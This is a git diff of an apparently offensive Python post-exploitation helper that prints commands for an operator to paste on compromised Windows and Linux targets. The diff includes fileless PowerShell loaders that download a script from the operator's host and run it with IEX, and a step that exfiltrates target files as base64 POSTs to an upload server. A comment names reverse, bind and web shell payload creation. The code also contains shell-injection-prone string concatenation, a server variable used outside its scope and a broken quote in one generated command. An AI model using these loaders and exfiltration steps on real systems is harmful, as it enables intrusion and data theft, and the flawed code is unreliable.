@@ -11,34 +11,39 @@ import netifaces as ni
 import time
 from getpass import getpass
 
-# UploadTo AVAILABLE METHODS (NEED TO ADD SMB AND FTP)
-UploadTo_Methods = [
+# UPLOAD TO WINDOW TARGET METHODS (NEED TO ADD SMB AND FTP)
+UploadTo_WinMethods = [
     'HTTP',
     'SCP',
     'Base64'
 ]
 
-# TRANFERFROM AVAILABLE WINMETHODS (NEED TO ADD 'SMB', 'FTP', 'WebDAV')
+# UPLOAD FROM WINDOWS TARGET METHODS (NEED TO ADD 'SMB', 'FTP', 'WebDAV')
 UploadFrom_WinMethods = [
     'Base64',
     'UploadServer'
 ]
 
-# POWERSHELL TRANSFER TO METHODS
+# POWERSHELL UPLOAD TO, METHODS
 PSTo_Methods = [
     'Invoke-WebRequest',
     'Invoke-WebRequest - Fileless',
-    'DownloadFile',
+    # 'DownloadFile',                   # CURRENTLY NOT WORKING
     'DownloadString - Fileless'
 ]
 
-# POWERSHELL TRANSFER FROM METHODS
+# POWERSHELL UPLOAD FROM, METHODS
 PSFrom_Methods = [
     'PSUpload.ps1',
     'Base64'
 ]
 
-# TRANFERFROM AVAILABLE NIXMETHODS (NEED TO ADD 'SMB', 'FTP', 'WebDAV')
+# UPLOAD TO LINUX TARGET METHODS
+UploadTo_NixMethods = [
+    'Base64'
+]
+
+# UPLOAD FROM LINUX TARGET METHODS (NEED TO ADD 'SMB', 'FTP', 'WebDAV')
 UploadFrom_NixMethods = [
     'Base64'
 ]
@@ -46,8 +51,14 @@ UploadFrom_NixMethods = [
 # DOWNLOAD METHODS
 Download_Methods = [
     'wget',
-    'curl'
+    'cURL'
 ]
+
+# PASTABLES OUTPUT TEMPLATE
+def pastables(cmd):
+    print('\n[================== RUN ON TARGET ==================]\n')
+    print(cmd)
+    print('\n[================ END RUN ON TARGET ================]\n')
 
 # GENERATE CHOICES BASED ON A DYNAMIC LIST
 def dynamic_populated_choices(entrymsg, dynamic_list):
@@ -95,6 +106,67 @@ def listening_ip_address():
         else:
             print('Invalid choice. Try again.')
 
+# GET ABSOLUTE PATH OF FILE ON TARGET
+def get_absolute_path():
+    print('[?] What is the absolute path of the file on target: ', end='')
+    try:
+        file_absolute_path = input()
+        return file_absolute_path
+    except KeyboardInterrupt:
+        sys.exit(0)
+
+# START HTTP SERVER AND CREATE COPY OF FILE TO BE TRANSFERRED
+def start_http_server(relpath):
+    listen_ip = listening_ip_address()
+    listen_port = '443'
+
+    # START PYTHON HTTP SERVER
+    print('[+] Starting HTTP server on ' + listen_ip + ':443 ...')
+    try:
+        pyserver = subprocess.Popen(['python', '-m', 'http.server', '-b', listen_ip, '443'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print('[+] HTTP server succesfully started')
+    except KeyboardInterrupt:
+        pyserver.terminate()
+        sys.exit(0)
+    except:
+        print('[!] Failed to start HTTP server')
+        sys.exit(1)
+
+    # COPY FILE TO BE TRANSFERRED TO CURRENT DIRECTORY
+    cmd = 'cp ' + relpath + ' .'
+    try:
+        subprocess.run(cmd, shell=True)
+    except:
+        print('[!] Could not temporarily copy file to current directory')
+
+# STOP HTTP SERVER AND DELETE COPY OF FILE TO BE TRANSFERRED
+def terminate_http_server(filename):
+    # TERMINATE HTTP SERVER
+    print('[?] Close HTTP server? [Y/n] ', end='')
+    time.sleep(1)
+    try:
+        subterminate = input().lower()
+    except KeyboardInterrupt:
+        pyserver.terminate()
+        sys.exit(0)
+    if subterminate == '':
+        subterminate = 'y'
+    if subterminate == 'n':
+        print('[!] HTTP server was left open')
+    else:
+        try:
+            pyserver.terminate()
+            print('[+] HTTP server succesfully terminated')
+        except:
+            print('[!] Could not terminate Python HTTP server')
+
+    # REMOVE TEMPORARY FILE
+    cmd = 'rm ' + filename
+    try:
+        subprocess.run(cmd, shell=True)
+    except:
+        print('[!] Temporary file to be transferred could not be deleted')
+
 # RUN COMMONLY USED COMMANDS
 def run_command(args):
     # RUN NMAP SCAN
@@ -117,13 +189,13 @@ def download_file(args):
     choice = dynamic_populated_choices(entrymsg, Download_Methods)
     if choice == 'wget':
         cmd = 'wget ' + args.url
-    elif choice == 'curl':
+    elif choice == 'cURL':
         cmd = 'curl ' + args.url + ' -o ' + args.url.split('/')[-1]
 
     # DOWNLOAD
     subprocess.run(cmd, shell=True)
 
-# CREATE A PAYLOAD
+# CREATE A REVERSE, BIND, OR WEB SHELL PAYLOAD
 def create_payload(args):
     if args.shell == 'bind':
         print('[?] Target IP: ', end='')
@@ -183,27 +255,22 @@ def upload_to(args):
 
     # SELECT METHOD
     entrymsg = '[?] What method to use?'
-    method = dynamic_populated_choices(entrymsg, UploadTo_Methods)
 
-    # PYTHON HTTP SERVER METHOD
-    if method == 'HTTP':
-        listen_ip = listening_ip_address()
+    #########################
+    ### TO WINDOWS TARGET ###
+    #########################
+    if args.os == 'windows':
+        # METHOD SELECTION
+        method = dynamic_populated_choices(entrymsg, UploadTo_WinMethods)
 
-        # START PYTHON HTTP SERVER
-        print('[+] Starting HTTP server on ' + listen_ip + ':443 ...')
-        try:
-            pyserver = subprocess.Popen(['python', '-m', 'http.server', '-b', listen_ip, '443'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            print('[+] HTTP server succesfully started')
-        except KeyboardInterrupt:
-            pyserver.terminate()
-            sys.exit(0)
-        except:
-            print('[!] Failed to start HTTP server')
-            sys.exit(1)
-        
-        # TARGET PASTABLES
-        if args.os == 'windows':
-            entrymsg = '[+] Select method:'
+        ###########################
+        ### WINDOWS HTTP METHOD ###
+        ###########################
+        if method == 'HTTP':
+            start_http_server(relpath)
+            
+            # TARGET PASTABLES
+            entrymsg = '[+] Select windows download method:'
             choice = dynamic_populated_choices(entrymsg, PSTo_Methods)
             if choice == 'DownloadFile':
                 print('[+] DownloadFile method selected')
@@ -217,131 +284,115 @@ def upload_to(args):
                     sync = 'sync'
                 if sync == 'async':
                     print('[+] Using Asynchronous DownloadFile')
-                    startcmd = '(New-Object Net.WebClient).DownloadFileAsync(\'https://' + listen_ip + '/' + args.filename + '\',\'' + rand_filename + '\')'
+                    startcmd = '(New-Object Net.WebClient).DownloadFileAsync(\'http://' + listen_ip + ':' + listen_port + '/' + args.filename + '\',\'' + rand_filename + '\')'
                     endcmd = ''
                 elif sync == 'sync':
                     print('[+] Using Synchronous DownloadFile')
-                    startcmd = '(New-Object Net.WebClient).DownloadFile(\'https://' + listen_ip + '/' + args.filename + '\',\'' + rand_filename + '\')'
+                    startcmd = '(New-Object Net.WebClient).DownloadFile(\'http://' + listen_ip + ':' + listen_port + '/' + args.filename + '\',\'' + rand_filename + '\')'
                     endcmd = ''
             elif choice == 'DownloadString - Fileless':
                 print('[+] DownloadString - Fileless method selected')
                 choice = random.randint(1, 2)
                 if choice == '1':
-                    startcmd = 'IEX (New-Object Net.WebClient).DownloadString(\'https://' + listen_ip + '/' + args.filename + '\')'
+                    startcmd = 'IEX (New-Object Net.WebClient).DownloadString(\'http://' + listen_ip + ':' + listen_port + '/' + args.filename + '\')'
                     endcmd = ''
                 else:
-                    startcmd = '(New-Object Net.WebClient).DownloadString(\'https://' + listen_ip + '/' + args.filename
+                    startcmd = '(New-Object Net.WebClient).DownloadString(\'http://' + listen_ip + ':' + listen_port + '/' + args.filename
                     endcmd = '\') | IEX'
             elif choice == 'Invoke-WebRequest':
                 print('[+] Invoke-WebRequest method selected')
-                startcmd = 'Invoke-WebRequest https://' + listen_ip + '/' + args.filename
+                startcmd = 'Invoke-WebRequest http://' + listen_ip + ':' + listen_port + '/' + args.filename
                 endcmd = ' -OutFile ' + rand_filename
             elif choice == 'Invoke-WebRequest - Fileless':
                 print('[+] Invoke-WebRequest - Fileless method selected')
-                startcmd = 'Invoke-WebRequest https://' + listen_ip + '/' + args.filename
+                startcmd = 'Invoke-WebRequest http://' + listen_ip + ':' + listen_port + '/' + args.filename
                 endcmd = ' | IEX'
             else:
                 print('[!] Invalid choice')
+            cmd = startcmd + endcmd
+            pastables(cmd)
 
-            command = startcmd + endcmd
+            terminate_http_server(args.filename)
 
             # if args.firstlaunch:
             #     command = startcmd + ' -UseBasicParsing' + endcmd
-
-            print('[+] Run this command on target')
-            print('\n[===== START WINDOWS POWERSHELL COMMAND =====]\n')
             # if args.trust:
             #     print('[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}')
-            print(command)
-            print('\n[====== END WINDOWS POWERSHELL COMMAND ======]\n')
-        elif args.os == 'linux':
-            print('\n[===== START LINUX COMMAND =====]\n')
-            print('wget https://' + listen_ip + '/' + args.filename)
-            print('\nOR\n')
-            print('curl https://' + listen_ip + '/' + args.filename + ' -o ' + '/tmp/' + rand_filename)
-            print('\n[====== END LINUX COMMAND ======]\n')
 
-        print('[?] Close HTTP server? [Y/n] ', end='')
-        time.sleep(1)
-        try:
-            subterminate = input().lower()
-        except KeyboardInterrupt:
-            pyserver.terminate()
-            sys.exit(0)
-        if subterminate == '':
-            subterminate = 'y'
-        if subterminate == 'n':
-            print('[!] HTTP server was left open')
-        else:
+        #############################    
+        ### WINDOWS BASE64 METHOD ###
+        #############################
+        elif method == 'Base64':
+            print('[+] Generating Base64 string of file')
+            b64_file = subprocess.run(['base64', '-w', '0', relpath], capture_output=True, text=True)
+            md5h = hashlib.md5(open(relpath, 'rb').read()).hexdigest()
+            print('[+] Run this command on target')
+
+            if args.os == 'windows':
+                cmd = '[IO.File]::WriteAllBytes(\"' + '.\", [Convert]::FromBase64String(\"' + b64_file.stdout + '")); Get-FileHash ' + args.filename + ' -Algorithm md5'
+                if len(cmd) > 8191:
+                    print('[!] cmd.exe has a maximum string length of 8,191 characters.')
+                    sys.exit(0)
+            elif args.os == 'linux':
+                cmd = 'echo -n \'' + b64_file.stdout + '\' | base64 -d > ' + args.filename + ' && md5sum ' + args.filename
+            pastables(cmd)
+
+            # VERIFY MD5 HASH
+            while(True):
+                try:
+                    print('[?] Paste MD5 checksum output here to compare: ', end='')
+                    md5c = input()
+                    if md5c == md5h:
+                        print('[+] MD5 checksum matches! You\'re good to go.')
+                        break
+                    else:
+                        print('[-] Uh-oh... MD5 checksum doesn\'t match. Try again.')
+                except KeyboardInterrupt:
+                    sys.exit(0)
+
+        ##########################
+        ### WINDOWS SCP METHOD ###
+        ##########################
+        elif method == 'SCP':
+            print('[?] Target IP: ', end='')
+            target_ip = input()
+            print('[?] Target port [default=22]: ', end='')
+            target_port = input()
+            if target_port == '':
+                target_port = '22'
+            print('[?] SCP Username: ', end='')
+            scp_user = input()
+            scp_password = getpass(prompt='[?] SCP Password: ')
+            print('[+] Uploading ' + args.filename + ' to /tmp on ' + target_ip + ' ...')
+            scp_connect = scp_user + '@' + target_ip + ':/tmp/' + rand_filename
+            res = subprocess.run(['scp', '-P', target_port, args.filename, scp_connect], capture_output=True, text=True)
+            if res.returncode == 0:
+                print('[+] File uploaded as /tmp/' + rand_filename)
+            elif res.returncode == 255:
+                print('[!] File could not be uploaded. Connection refused.')
+
+    #######################
+    ### TO LINUX TARGET ###
+    #######################
+    elif args.os == 'linux':
+        # METHOD SELECTION
+        method = dynamic_populated_choices(entrymsg, UploadTo_NixMethods)
+
+        ###########################
+        ### LINUX BASE64 METHOD ###
+        ###########################
+        if method == 'Base64':
+            # GENERATE BASE64 STRING
+            cmd = 'cat ' + relpath + ' | base64 -w 0'
             try:
-                pyserver.terminate()
-                print('[+] HTTP server succesfully terminated')
-            except:
-                print('[!] Could not terminate Python HTTP server')
-        
-    # BASE64 METHOD
-    elif method == 'Base64':
-        print('[+] Generating Base64 string of file')
-        b64_file = subprocess.run(['base64', '-w', '0', relpath], capture_output=True, text=True)
-        md5h = hashlib.md5(open(relpath, 'rb').read()).hexdigest()
-        print('[+] Run this command on target')
-
-        # ON WINDOWS POWERSHELL LESS THAN 8191 CHARACTERS
-        if args.os == 'windows':
-            cmd = '[IO.File]::WriteAllBytes(\"' + '.\", [Convert]::FromBase64String(\"' + b64_file.stdout + '")); Get-FileHash ' + args.filename + ' -Algorithm md5'
-            if len(cmd) <= 8191:
-                print('\n[===== START WINDOWS POWERSHELL COMMAND =====]\n')
-                print(cmd)
-                print('\n[====== END WINDOWS POWERSHELL COMMAND ======]\n')
-            else:
-                print('[!] cmd.exe has a maximum string length of 8,191 characters.')
-        # ON LINUX
-        elif args.os == 'linux':
-            print('\n[===== START LINUX COMMAND =====]\n')
-            print('echo \'' + b64_file.stdout + '\' | base64 -d > ' + args.filename + ' && md5sum ' + args.filename)
-            print('\n[====== END LINUX COMMAND ======]\n')
-
-
-        # VERIFY MD5 HASH
-        while(True):
-            try:
-                print('[?] Paste MD5 checksum output here to compare: ', end='')
-                md5c = input()
-                if md5c == md5h:
-                    print('[+] MD5 checksum matches! You\'re good to go.')
-                    break
-                else:
-                    print('[-] Uh-oh... MD5 checksum doesn\'t match. Try again.')
+                proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
+                b64 = proc.stdout.decode()
             except KeyboardInterrupt:
-                sys.exit(0)
+                print('[!] File not found')
 
-    # SCP METHOD
-    elif method == 'SCP':
-        print('[?] Target IP: ', end='')
-        target_ip = input()
-        print('[?] Target port [default=22]: ', end='')
-        target_port = input()
-        if target_port == '':
-            target_port = '22'
-        print('[?] SCP Username: ', end='')
-        scp_user = input()
-        scp_password = getpass(prompt='[?] SCP Password: ')
-        print('[+] Uploading ' + args.filename + ' to /tmp on ' + target_ip + ' ...')
-        scp_connect = scp_user + '@' + target_ip + ':/tmp/' + rand_filename
-        res = subprocess.run(['scp', '-P', target_port, args.filename, scp_connect], capture_output=True, text=True)
-        if res.returncode == 0:
-            print('[+] File uploaded as /tmp/' + rand_filename)
-        elif res.returncode == 255:
-            print('[!] File could not be uploaded. Connection refused.')
-
-# GET ABSOLUTE PATH OF FILE ON TARGET
-def get_absolute_path():
-    print('[?] What is the absolute path of the file on target: ', end='')
-    try:
-        file_absolute_path = input()
-        return file_absolute_path
-    except KeyboardInterrupt:
-        sys.exit(0)
+            cmd = '# CREATE ' + args.filename.upper() + ' ON TARGET\n'
+            cmd += 'echo -n \'' + b64 + ' | base64 -d > ' + args.filename    
+            pastables(cmd)
 
 # UPLOAD FILES FROM
 def upload_from(args):
@@ -368,24 +419,26 @@ def upload_from(args):
             file_absolute_path = get_absolute_path()
             filename = file_absolute_path.split('\\')[-1]
             while True:
-                cmd = '[Convert]::ToBase64String((Get-Content -path \"' + file_absolute_path + '\" -Encoding byte))'
-                cmd2 = 'Get-FileHash ' + file_absolute_path + ' -Algorithm md5'
-                print('\n[================== RUN ON TARGET ==================]\n')
-                print('# GENERATE BASE64 STRING')
-                print(cmd)
-                print('\n# GENERATE MD5 CHECKSUM')
-                print(cmd2)
-                print('\n[================ END RUN ON TARGET ================]\n')
+                cmd = '# GENERATE BASE64 STRING\n'
+                cmd += '[Convert]::ToBase64String((Get-Content -path \"' + file_absolute_path + '\" -Encoding byte))\n'
+                cmd += '\n# GENERATE MD5 CHECKSUM\n'
+                cmd += 'Get-FileHash ' + file_absolute_path + ' -Algorithm md5'
+                pastables(cmd)
                 print('[?] Paste generated Base64 string here: ', end='')
                 try:
                     b64 = input()
                 except KeyboardInterrupt:
                     sys.exit(0)
+                print('[?] Paste generated MD5 checksum here: ', end='')
+                try:
+                    md5_target_hash = input()
+                except KeyboardInterrupt:
+                    sys.exit(0)
                 cmd = 'echo \'' + b64 + '\' | base64 -d > ' + filename
                 create_file = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
                 create_file.wait()
-                md5h = hashlib.md5(open(filename, 'rb').read()).hexdigest()
-                if b64 == md5h:
+                md5_host_hash = hashlib.md5(open(filename, 'rb').read()).hexdigest()
+                if md5_target_hash == md5_host_hash:
                     print('[+] File succesfully transferred to current directory')
                     break
                 else:
@@ -432,9 +485,7 @@ def upload_from(args):
                 cmd += '$b64 = [System.convert]::ToBase64String((Get-Content -Path \'' + file_absolute_path + '\' -Encoding Byte))\n'
                 cmd += '\n# UPLOAD ' + filename.upper() + ' TO UPLOAD SERVER\n'
                 cmd += 'Invoke-WebRequest -Uri https://' + listen_ip + '/ -Method POST -Body $b64'
-            print('\n[================== RUN ON TARGET ==================]\n')
-            print(cmd)
-            print('\n[================ END RUN ON TARGET ================]\n')
+            pastables(cmd)
 
             # TERMINATE UPLOAD SERVER WHEN DONE
             print('[?] Close upload server? [Y/n] ', end='')
